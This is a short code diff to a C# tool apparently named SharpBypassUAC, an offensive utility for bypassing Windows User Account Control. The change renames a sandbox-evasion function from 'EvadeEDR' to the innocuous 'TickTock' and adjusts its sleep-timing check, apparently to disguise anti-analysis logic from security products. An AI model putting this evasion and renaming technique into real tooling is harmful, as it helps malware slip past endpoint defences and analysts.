@@ -11,20 +11,23 @@ namespace SharpBypassUAC
 
     class SharpBypassUAC
     {
-        static void EvadeEDR()
+        static void TickTock()
         {
             DateTime startTime = DateTime.Now;
             Thread.Sleep(10000);
             double stopTime = DateTime.Now.Subtract(startTime).TotalSeconds;
 
-            if (stopTime < 4.5)
+            if (stopTime < 7.5)
             {
                 return;
             }
         }
+
+        
         static void Main(string[] args)
         {
-            EvadeEDR();
+            
+            TickTock();
             //Setting the command line parameters
             string bypass = null;
             byte[] encodedCommand = null;
